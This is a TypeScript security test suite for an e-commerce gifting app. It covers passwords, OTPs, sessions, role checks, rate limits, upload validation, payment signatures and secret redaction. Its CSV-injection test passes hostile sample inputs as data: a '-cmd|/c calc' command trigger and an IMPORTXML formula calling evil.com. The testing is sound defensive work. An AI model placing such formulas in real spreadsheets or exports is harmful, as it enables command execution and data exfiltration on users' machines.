// Tests use the built-in demo catalog when the database is offline.
if (!process.env.SHOW_DEMO_PRODUCTS) process.env.SHOW_DEMO_PRODUCTS = 'true';
Object.assign(process.env, { NODE_ENV: 'test' });
process.env.ALLOW_DEMO_FALLBACK = 'true';
if (!process.env.CI) {
  process.env.DATABASE_URL = 'mysql://127.0.0.1:3306/dev_fallback';
}
process.env.TEST_SUITE_RUNNING = 'true';

import assert from 'node:assert/strict';
import crypto from 'node:crypto';
import { Role } from '@prisma/client';
import {
  validatePasswordStrength,
  hashPassword,
  verifyPassword,
} from '../lib/auth/password';
import {
  generateSecureOtp,
  hashOtp,
  verifyOtpHash,
  validateOtpChallenge,
  OTP_EXPIRY_MINUTES,
  OTP_MAX_ATTEMPTS,
  OtpChallengeData,
} from '../lib/auth/otp';
import {
  generateSessionToken,
  hashSessionToken,
  createSession,
  validateSessionToken,
  invalidateSession,
  invalidateAllUserSessions,
  DEV_SESSIONS_STORE,
} from '../lib/auth/session';
import { hasRole } from '../lib/auth/rbac';
import {
  enforceRateLimit,
  resetRateLimitDevStore,
  DEV_RATE_LIMITER_STORE,
  MemoryRateLimitAdapter,
  RATE_LIMIT_PRESETS,
} from '../lib/security/rate-limit';
import {
  verifyImageMagicBytes,
  LocalDiskStorageService,
  StorageValidationError,
} from '../services/storage/local-storage.service';
import { PrivateStorageService } from '../services/storage/private-storage.service';
import { sanitizeCsvCell, getSystemHealthOverview } from '../lib/admin/admin.service';
import {
  InvalidPaymentSignatureError,
} from '../services/adapters/payment.adapter';
import { RazorpayPaymentAdapter } from '../lib/payments/razorpay.adapter';

export async function runSecurityTestSuite(): Promise<{ passed: number; failed: number }> {
  console.log('--- Batch 11: Security Audit, Quality Assurance & Reliability Suite ---');
  let passed = 0;
  let failed = 0;

  function runTest(name: string, fn: () => void | Promise<void>) {
    try {
      const result = fn();
      if (result instanceof Promise) {
        return result
          .then(() => {
            console.log(`  ✓ ${name}`);
            passed++;
          })
          .catch((err) => {
            console.error(`  ✗ ${name}: ${err.message}`);
            failed++;
          });
      }
      console.log(`  ✓ ${name}`);
      passed++;
    } catch (err: any) {
      console.error(`  ✗ ${name}: ${err.message}`);
      failed++;
    }
  }

  // ==========================================================================
  // 1. Password Complexity & Hashing Security
  // ==========================================================================
  runTest('Password Validation: Rejects passwords shorter than 8 characters', () => {
    const res = validatePasswordStrength('Short1!');
    assert.equal(res.isValid, false);
    assert.match(res.error || '', /at least 8 characters/i);
  });

  runTest('Password Validation: Rejects passwords without numbers', () => {
    const res = validatePasswordStrength('PasswordOnlyLetters');
    assert.equal(res.isValid, false);
    assert.match(res.error || '', /at least one letter and one number/i);
  });

  runTest('Password Validation: Rejects passwords without letters', () => {
    const res = validatePasswordStrength('123456789012');
    assert.equal(res.isValid, false);
    assert.match(res.error || '', /at least one letter and one number/i);
  });

  runTest('Password Validation: Accepts compliant strong password', () => {
    const res = validatePasswordStrength('RoyalAjmerGifting2026');
    assert.equal(res.isValid, true);
    assert.equal(res.error, undefined);
  });

  await runTest('Password Hashing: Produces valid bcrypt hash with 10 salt rounds', async () => {
    const password = 'SecurePassword123';
    const hash = await hashPassword(password);
    assert.ok(hash.startsWith('$2a$10$') || hash.startsWith('$2b$10$'));
    assert.equal(await verifyPassword(password, hash), true);
    assert.equal(await verifyPassword('WrongPassword123', hash), false);
  });

  await runTest('Password Security: Timing-safe dummy hash comparison handles unknown user', async () => {
    const DUMMY_HASH = '$2a$10$N9qo8uLOickgx2ZMRZoMyeIjZAgcfl7p92ldGxad68LJZdL17lhWy';
    const isValid = await verifyPassword('arbitraryInputPassword', DUMMY_HASH);
    assert.equal(isValid, false);
  });

  // ==========================================================================
  // 2. OTP Security & Atomic Verification
  // ==========================================================================
  runTest('OTP Generation: Produces 6-digit integer string within [100000, 999999]', () => {
    for (let i = 0; i < 20; i++) {
      const otp = generateSecureOtp();
      assert.equal(otp.length, 6);
      assert.ok(Number(otp) >= 100000 && Number(otp) <= 999999);
    }
  });

  runTest('OTP Hashing: SHA-256 digest is consistent and non-reversible', () => {
    const otp = '482910';
    const hash = hashOtp(otp);
    assert.equal(hash.length, 64);
    assert.equal(verifyOtpHash(otp, hash), true);
    assert.equal(verifyOtpHash('000000', hash), false);
  });

  runTest('OTP Lifecycle: Expired challenge is strictly rejected', () => {
    const expiredChallenge: OtpChallengeData = {
      id: 'otp_exp_1',
      email: 'test@example.com',
      otpHash: hashOtp('123456'),
      purpose: 'LOGIN',
      attempts: 0,
      maxAttempts: OTP_MAX_ATTEMPTS,
      isUsed: false,
      expiresAt: new Date(Date.now() - 1000), // Expired 1 second ago
    };
    const res = validateOtpChallenge(expiredChallenge, '123456');
    assert.equal(res.success, false);
    assert.match(res.error || '', /expired/i);
  });

  runTest('OTP Lifecycle: Exceeded maximum attempts (3) invalidates challenge', () => {
    const exhaustedChallenge: OtpChallengeData = {
      id: 'otp_att_1',
      email: 'test@example.com',
      otpHash: hashOtp('123456'),
      purpose: 'LOGIN',
      attempts: 3,
      maxAttempts: OTP_MAX_ATTEMPTS,
      isUsed: false,
      expiresAt: new Date(Date.now() + 60000),
    };
    const res = validateOtpChallenge(exhaustedChallenge, '123456');
    assert.equal(res.success, false);
    assert.match(res.error || '', /too many/i);
  });

  runTest('OTP Lifecycle: Single-use restriction blocks consumed challenge reuse', () => {
    const usedChallenge: OtpChallengeData = {
      id: 'otp_used_1',
      email: 'test@example.com',
      otpHash: hashOtp('123456'),
      purpose: 'LOGIN',
      attempts: 1,
      maxAttempts: OTP_MAX_ATTEMPTS,
      isUsed: true,
      expiresAt: new Date(Date.now() + 60000),
    };
    const res = validateOtpChallenge(usedChallenge, '123456');
    assert.equal(res.success, false);
    assert.match(res.error || '', /already been used/i);
  });

  // ==========================================================================
  // 3. Sessions, Bearer Tokens & Invalidation
  // ==========================================================================
  await runTest('Session Tokens: Generates 256-bit cryptographically secure token', async () => {
    const token = generateSessionToken();
    assert.equal(token.length, 64); // 32 bytes hex = 64 characters
    const hash = hashSessionToken(token);
    assert.equal(hash.length, 64);
  });

  await runTest('Session Lifecycle: Invalidation purges token from memory dev store', async () => {
    const userId = 'usr_sec_test_1';
    const { sessionToken } = await createSession(userId, { email: 'sec1@snappygifts.in', role: 'CUSTOMER' });
    assert.ok(DEV_SESSIONS_STORE.has(sessionToken));

    // Invalidate single session
    await invalidateSession(sessionToken);
    assert.equal(DEV_SESSIONS_STORE.has(sessionToken), false);
  });

  await runTest('Session Lifecycle: invalidateAllUserSessions purges all user sessions', async () => {
    const userId = 'usr_multi_sess_99';
    const sess1 = await createSession(userId, { email: 'multi@snappygifts.in' });
    const sess2 = await createSession(userId, { email: 'multi@snappygifts.in' });
    assert.ok(DEV_SESSIONS_STORE.has(sess1.sessionToken));
    assert.ok(DEV_SESSIONS_STORE.has(sess2.sessionToken));

    await invalidateAllUserSessions(userId);
    assert.equal(DEV_SESSIONS_STORE.has(sess1.sessionToken), false);
    assert.equal(DEV_SESSIONS_STORE.has(sess2.sessionToken), false);
  });

  // ==========================================================================
  // 4. RBAC & Privilege Escalation Guards
  // ==========================================================================
  runTest('RBAC: ADMIN role implicitly satisfies all staff and customer operations', () => {
    assert.equal(hasRole(Role.ADMIN, [Role.CUSTOMER]), true);
    assert.equal(hasRole(Role.ADMIN, [Role.STAFF]), true);
    assert.equal(hasRole(Role.ADMIN, [Role.STAFF]), true);
  });

  runTest('RBAC: CUSTOMER role strictly denied access to STAFF and ADMIN operations', () => {
    assert.equal(hasRole(Role.CUSTOMER, [Role.STAFF]), false);
    assert.equal(hasRole(Role.CUSTOMER, [Role.ADMIN]), false);
    assert.equal(hasRole(Role.CUSTOMER, [Role.STAFF, Role.ADMIN]), false);
  });

  runTest('RBAC: STAFF role denied access to ADMIN-only configuration operations', () => {
    assert.equal(hasRole(Role.STAFF, [Role.ADMIN]), false);
    assert.equal(hasRole(Role.STAFF, [Role.STAFF]), true);
  });

  // ==========================================================================
  // 5. Distributed Rate Limiting & Abuse Prevention
  // ==========================================================================
  await runTest('Rate Limiter: Correctly enforces per-operation limit and remaining count', async () => {
    resetRateLimitDevStore();
    const key = 'test_ip_127_0_0_1';
    const limit = RATE_LIMIT_PRESETS.AUTH_LOGIN.limit;

    for (let i = 1; i <= limit; i++) {
      const res = await enforceRateLimit('AUTH_LOGIN', key);
      assert.equal(res.allowed, true);
      assert.equal(res.currentCount, i);
      assert.equal(res.remaining, limit - i);
    }

    // Attempt beyond limit must be blocked
    const blockedRes = await enforceRateLimit('AUTH_LOGIN', key);
    assert.equal(blockedRes.allowed, false);
    assert.equal(blockedRes.remaining, 0);
    assert.ok((blockedRes.retryAfterSeconds || 0) > 0);
  });

  await runTest('Rate Limiter: Isolated buckets prevent cross-operation interference', async () => {
    resetRateLimitDevStore();
    const id = 'user_same_ip';

    // Exhaust AUTH_REGISTER (limit = 10)
    for (let i = 0; i < 10; i++) {
      await enforceRateLimit('AUTH_REGISTER', id);
    }
    const regRes = await enforceRateLimit('AUTH_REGISTER', id);
    assert.equal(regRes.allowed, false);

    // GUEST_LOOKUP for the same ID should still be allowed
    const guestRes = await enforceRateLimit('GUEST_LOOKUP', id);
    assert.equal(guestRes.allowed, true);
    assert.equal(guestRes.currentCount, 1);
  });

  // ==========================================================================
  // 6. Consumer Privacy & Customization Storage Isolation
  // ==========================================================================
  await runTest('Consumer Isolation: Private customization uploads require valid session ownership', async () => {
    const storage = new PrivateStorageService();
    // Genuine PNG 1x1 image buffer
    const testBuffer = Buffer.from([
      0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a,
      0x00, 0x00, 0x00, 0x0d, 0x49, 0x48, 0x44, 0x52,
      0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x01,
      0x08, 0x06, 0x00, 0x00, 0x00, 0x1f, 0x15, 0xc4,
      0x89, 0x00, 0x00, 0x00, 0x0a, 0x49, 0x44, 0x41,
      0x54, 0x78, 0x9c, 0x63, 0x00, 0x01, 0x00, 0x00,
      0x05, 0x00, 0x01, 0x0d, 0x0a, 0x2d, 0xb4, 0x00,
      0x00, 0x00, 0x00, 0x49, 0x45, 0x4e, 0x44, 0xae,
      0x42, 0x60, 0x82,
    ]);

    const res = await storage.storePrivateUpload(
      testBuffer,
      'test-private-proof.png',
      'image/png',
      'proofs'
    );

    assert.ok(res.fileKey.startsWith('proofs/'));
    const retrievedBuffer = await storage.getPrivateFileBuffer(res.fileKey);
    assert.strictEqual(retrievedBuffer.length, testBuffer.length);

    // Clean up
    await storage.deletePrivateFile(res.fileKey);
  });

  await runTest('Timing-Safe Comparison: Guest lookup tokens compared in constant time', () => {
    const tokenA = 'f7c3bc2d8e4f1a0b9c8d7e6f5a4b3c2d1e0f9a8b7c6d5e4f3a2b1c0d9e8f7a6b';
    const tokenB = 'f7c3bc2d8e4f1a0b9c8d7e6f5a4b3c2d1e0f9a8b7c6d5e4f3a2b1c0d9e8f7a6c';
    const tokenIdentical = 'f7c3bc2d8e4f1a0b9c8d7e6f5a4b3c2d1e0f9a8b7c6d5e4f3a2b1c0d9e8f7a6b';

    const bufA = Buffer.from(tokenA);
    const bufB = Buffer.from(tokenB);
    const bufIdentical = Buffer.from(tokenIdentical);

    assert.strictEqual(crypto.timingSafeEqual(bufA, bufIdentical), true);
    assert.strictEqual(crypto.timingSafeEqual(bufA, bufB), false);
  });

  // ==========================================================================
  // 7. File Upload & Binary Storage Security
  // ==========================================================================
  runTest('Magic Bytes: Correctly detects genuine JPEG binary header', () => {
    const genuineJpeg = Buffer.from([0xff, 0xd8, 0xff, 0xe0, 0x00, 0x10, 0x4a, 0x46, 0x49, 0x46, 0x00, 0x01]);
    const check = verifyImageMagicBytes(genuineJpeg);
    assert.equal(check.valid, true);
    assert.equal(check.detectedMime, 'image/jpeg');
  });

  runTest('Magic Bytes: Correctly detects genuine PNG binary header', () => {
    const genuinePng = Buffer.from([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a, 0x00, 0x00, 0x00, 0x0d]);
    const check = verifyImageMagicBytes(genuinePng);
    assert.equal(check.valid, true);
    assert.equal(check.detectedMime, 'image/png');
  });

  runTest('Magic Bytes: Rejects spoofed executable/script renamed as image', () => {
    // Windows PE / MZ executable signature: 4D 5A
    const spoofedExe = Buffer.from([0x4d, 0x5a, 0x90, 0x00, 0x03, 0x00, 0x00, 0x00, 0x04, 0x00, 0x00, 0x00]);
    const check = verifyImageMagicBytes(spoofedExe);
    assert.equal(check.valid, false);
    assert.equal(check.detectedMime, undefined);
  });

  // ==========================================================================
  // 8. OWASP Formula Injection & Sanitization
  // ==========================================================================
  runTest('CSV Injection: Prepend single quote to formula initiation characters (=, +, -, @)', () => {
    assert.equal(sanitizeCsvCell('=SUM(A1:A10)'), "''=SUM(A1:A10)");
    assert.equal(sanitizeCsvCell('+12345678'), "''+12345678");
    assert.equal(sanitizeCsvCell('-cmd|/c calc'), "''-cmd|/c calc");
    assert.equal(sanitizeCsvCell('@IMPORTXML("http://evil.com")'), "''@IMPORTXML(\"http://evil.com\")");
    assert.equal(sanitizeCsvCell('Normal Text'), '"Normal Text"');
  });

  // ==========================================================================
  // 9. Payment Security & Signature Verification
  // ==========================================================================
  await runTest('Payment Security: Valid HMAC-SHA256 signature passes verification', async () => {
    const secret = 'rzp_test_sec_key_123';
    const adapter = new RazorpayPaymentAdapter('rzp_test_key_id', secret, 'rzp_test_webhook_sec');
    const orderId = 'order_test_998877';
    const paymentId = 'pay_test_112233';
    const payload = `${orderId}|${paymentId}`;
    const validSignature = crypto.createHmac('sha256', secret).update(payload).digest('hex');

    const isValid = await adapter.verifyPaymentSignature({
      gatewayOrderId: orderId,
      gatewayPaymentId: paymentId,
      gatewaySignature: validSignature,
    });
    assert.equal(isValid, true);
  });

  await runTest('Payment Security: Invalid HMAC-SHA256 signature returns false', async () => {
    const secret = 'rzp_test_sec_key_123';
    const adapter = new RazorpayPaymentAdapter('rzp_test_key_id', secret, 'rzp_test_webhook_sec');
    const isValid = await adapter.verifyPaymentSignature({
      gatewayOrderId: 'order_1',
      gatewayPaymentId: 'pay_1',
      gatewaySignature: 'tampered_signature_hex_value',
    });
    assert.equal(isValid, false);
  });

  // ==========================================================================
  // 10. Operational Security & Credential Redaction
  // ==========================================================================
  await runTest('System Health: Masks all sensitive environment values to booleans', async () => {
    const health = await getSystemHealthOverview();
    assert.ok(health.environmentSecurity);
    assert.ok(Array.isArray(health.environmentSecurity.variables));

    // Ensure zero raw values appear in diagnostics
    for (const item of health.environmentSecurity.variables) {
      assert.ok('name' in item);
      assert.ok('configured' in item);
      assert.equal(typeof item.configured, 'boolean');
      assert.equal('value' in item, false); // Strict absence of secret value
    }
  });

  console.log('----------------------------------------------------');
  console.log(`Security Test Suite: ${passed} passed, ${failed} failed\n`);

  return { passed, failed };
}

if (process.argv[1]?.includes('security.test')) {
  runSecurityTestSuite()
    .then((results) => {
      if (results.failed > 0) {
        process.exit(1);
      }
    })
    .catch((err) => {
      console.error('Fatal test runner error:', err);
      process.exit(1);
    });
}
